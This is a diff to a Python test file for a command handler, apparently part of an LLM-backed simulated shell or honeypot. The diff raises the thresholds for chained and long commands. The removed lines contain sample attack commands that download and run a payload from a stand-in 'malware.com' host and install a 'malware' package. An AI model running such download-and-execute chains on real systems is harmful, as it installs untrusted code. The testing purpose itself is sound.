@@ -18,17 +18,20 @@ class TestLongCommands:
         return h
 
     def test_complex_chain_detection(self, handler):
-        # 1. Chained with && (Should trigger)
-        cmd = "cd /tmp && wget http://malware.com && chmod +x malware && ./malware"
+        # 1. Chained with && (Should trigger if > 30)
+        # Create a chain of 35 commands to exceed the 30-limit
+        # "printf 0 && printf 1 ... && printf 34"
+        cmd = " && ".join([f"printf {i}" for i in range(35)])
+        
         resp, _, meta = handler.process_command(cmd, {})
         
         handler.handle_generic.assert_called_once()
         assert resp == "generic_response"
         
     def test_long_command_length(self, handler):
-        # 2. Very long command > 150 chars
+        # 2. Very long command > 4096 chars
         # We use 'printf' instead of 'echo' because 'echo' is now EXEMPT from complexity checks.
-        cmd = "printf " + "A" * 200
+        cmd = "printf " + "A" * 5000
         handler.handle_generic.reset_mock()
         
         resp, _, meta = handler.process_command(cmd, {})
@@ -47,7 +50,7 @@ class TestLongCommands:
         handler.handle_ls.assert_called_once()
 
     def test_semicolon_pass(self, handler):
-        # 4. Simple semicolon chain (Should NOT trigger if < 3 semicolons and short)
+        # 4. Simple semicolon chain (Should NOT trigger if <= 30 semicolons)
         cmd = "echo A ; echo B"
         # Mock handle_echo
         handler.handle_echo = MagicMock(return_value=("echo_out", {}, {'source': 'local'}))
@@ -71,14 +74,15 @@ class TestLongCommands:
         
         # Setup mocks for dependencies
         context = {'cwd': '/root', 'session_id': 'test_sess'}
-        # We need > 2 '&&' to trigger complexity offload (otherwise handled locally)
-        chain_cmd = "apt-get update && apt-get install malware -y && echo persistent && echo done"
+        # We need > 30 '&&' to trigger complex offload
+        part_list = [f"printf {i}" for i in range(35)]
+        chain_cmd = " && ".join(part_list)
         
         # 1. Cache Miss
         mock_db.get_cached_response.return_value = None
         
         # 2. LLM Response
-        mock_llm.generate_response.return_value = '{"output": "installing malware...", "new_cwd": "/root"}'
+        mock_llm.generate_response.return_value = '{"output": "simulated chain output...", "new_cwd": "/root"}'
         
         # Act
         resp, updates, meta = h.process_command(chain_cmd, context)
@@ -94,11 +98,9 @@ class TestLongCommands:
         
         # 3. Check Caching
         mock_db.cache_response.assert_called_once()
-        # Verify it cached the LLM response
-        assert "installing malware" in str(mock_db.cache_response.call_args)
         
         # 4. Check Return
-        assert "installing malware" in resp
+        assert "simulated chain" in resp
         assert meta['source'] == 'llm'
 
     def test_complex_chain_cache_hit(self):
@@ -110,10 +112,8 @@ class TestLongCommands:
         h = CommandHandler(mock_llm, mock_db)
         
         context = {'cwd': '/root', 'session_id': 'test_sess'}
-        # Must contain && or ;; or be long to trigger offload
-        # We use 'sleep' because 'echo' is exempt.
-        # We need > 2 '&&' to trigger complexity now that we support simple chaining locally.
-        chain_cmd = "sleep 1 && sleep 2 && sleep 3 && sleep 4"
+        # Must contain >30 &&
+        chain_cmd = " && ".join([f"sleep {i}" for i in range(35)])
         
         # 1. Cache HIT
         # db.get_cached_response returns raw text or JSON string
